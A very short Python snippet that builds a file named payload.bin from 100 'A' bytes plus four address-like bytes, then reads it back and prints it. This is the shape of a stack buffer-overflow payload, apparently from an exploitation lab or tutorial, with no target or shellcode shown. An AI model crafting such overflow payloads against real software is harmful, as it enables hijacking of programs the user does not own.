with open("payload.bin", "wb") as f:
    f.write(b"A" * 100 + b"\xDD\xCC\xCC\xAA")
with open("payload.bin", "rb") as f:
    data = f.read()
    print(data)
